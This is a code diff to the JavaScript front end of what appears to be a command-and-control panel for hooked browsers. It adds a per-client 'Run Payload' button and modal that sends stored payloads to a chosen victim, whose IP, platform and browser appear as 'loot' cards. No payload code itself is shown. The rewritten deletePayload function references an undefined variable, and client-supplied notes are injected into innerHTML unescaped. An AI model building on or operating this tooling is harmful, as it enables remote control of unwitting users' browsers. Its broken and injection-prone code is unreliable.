@@ -216,7 +216,7 @@ function importPayloads(event)
 	reader.onload = function(event)
 	{
 		const fileContent = event.target.result;
-		
+
 		try 
 		{
 			const jsonData = JSON.parse(fileContent);
@@ -352,10 +352,95 @@ async function runPayloadAllClient(button)
 
 
 
-async function deletePayload(event, payload)
+
+async function runPayloadSingleClient(button, modal)
+{
+	var payloadId = button.id;
+	var clientId  = button.client;
+
+	fetch('/api/runPayloadSingleClient', {
+		method:"POST",
+		body: JSON.stringify({
+			payloadKey: payloadId,
+			clientKey: clientId
+		}),
+		headers: {
+			"Content-type": "application/json; charset=UTF-8"
+		}
+	});
+
+	button.style.borderWidth = '2px';
+	button.style.borderColor = 'green';
+
+	setTimeout(function()
+	{
+		button.style.borderWidth = '';
+		button.style.borderColor = '';
+		modal.hide();
+	}, 750);
+}
+
+
+
+function showSingleClientPayloadModal(event, client)
+{
+	var modal = new bootstrap.Modal(document.getElementById('singleClientPayloadModal'));
+	var savedPayloadsList = document.getElementById('singleClientPayloadList');
+
+	refreshSingleClientPayloadList(client, modal);
+	modal.show();
+	// Block resetting of loot card stack
+	event.stopPropagation();
+}
+
+
+
+async function deletePayload(button)
 {
 	await fetch('/api/deletePayload/' + payload.id);
 	refreshSavedPayloadList();
+}
+
+
+async function refreshSingleClientPayloadList(client, modal)
+{
+	var savedPayloadsList = document.getElementById('singleClientPayloadList');
+
+	savedPayloadsList.innerHTML = '';
+
+	// Let's get our saved payloads from the database
+	var req = await fetch('/api/getSavedPayloads');
+	var jsonResponse = await req.json();
+
+	for (let i = 0; i < jsonResponse.length; i++)
+	{
+		id   = jsonResponse[i].id;
+		name = jsonResponse[i].name;
+
+		var payload = document.createElement('li');
+		payload.className   = 'list-group-item d-flex justify-content-between align-items-center';
+		payload.textContent = name;
+		payload.name        = name;
+		payload.id          = id;
+
+		var executePayloadButton         = document.createElement('button');
+		executePayloadButton.id          = id;
+		executePayloadButton.client      = client;
+		executePayloadButton.className   = 'btn btn-sm me-2';
+		executePayloadButton.textContent = 'Run Payload';
+		executePayloadButton.setAttribute('data-toggle', 'tooltip');
+		executePayloadButton.setAttribute('title', 'Run Payload on this Client');
+
+
+		executePayloadButton.addEventListener('click', function()
+		{
+			// Run on this clients
+			runPayloadSingleClient(this, modal);
+		})
+
+		payload.appendChild(executePayloadButton);
+		savedPayloadsList.appendChild(payload);
+	}
 }
 
 
@@ -1188,24 +1273,30 @@ async function updateClients()
     	cardTitle.innerHTML += '<img src="/protectedStatic/star.svg" style="float: right;" onclick="toggleStar(this, event,' + `'` + client.id + `','` + client.nickname + `')">`;
     }
 
+
     cardTitle.innerHTML += '<img src="/protectedStatic/x-circle.svg" style="float: right; margin-right: 10px;" onclick="blockClient(this, event,' + `'` + client.id + `','` + client.nickname + `')">`;
     cardTitle.innerHTML += '&nbsp;&nbsp;&nbsp';
 
-    cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b><br>";
+    cardText.innerHTML  = "IP:<b>&nbsp;&nbsp;&nbsp;" + client.ip + "</b>";
+
 		//What to do about client notes?
     if (client.notes.length > 0)
     {
-    	cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(event,' + `'` 
+    	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showNoteEditor(event,' + `'` 
     	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Edit Notes</button>';
     }
     else
     {
-    	cardText.innerHTML += '<button type="button" class="btn btn-primary" style="float: right;" onclick=showNoteEditor(event,' + `'` 
+    	cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showNoteEditor(event,' + `'` 
     	+ client.id + `','` + client.nickname  + `','` + client.notes + `'`+ ')>Add Notes</button>';
     }
 
-    cardText.innerHTML += "Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
+    cardText.innerHTML += "<br>Platform:<b>&nbsp;&nbsp;&nbsp;" + client.platform + "</b><br>";
     cardText.innerHTML += "Browser:<b>&nbsp;&nbsp;&nbsp;" + client.browser + "</b>";
+
+    cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" style="float: right;" onclick=showSingleClientPayloadModal(event,' + `'` 
+    	+ client.id + `'`+ ')>Run Payload</button>';
+
 
     cardSubtitle.innerHTML  = "First Seen: " + humanized_time_span(client.firstSeen) + "&nbsp;&nbsp;&nbsp;";
     cardSubtitle.innerHTML += "Last Seen: <b>" + humanized_time_span(client.lastSeen) + "</b>";
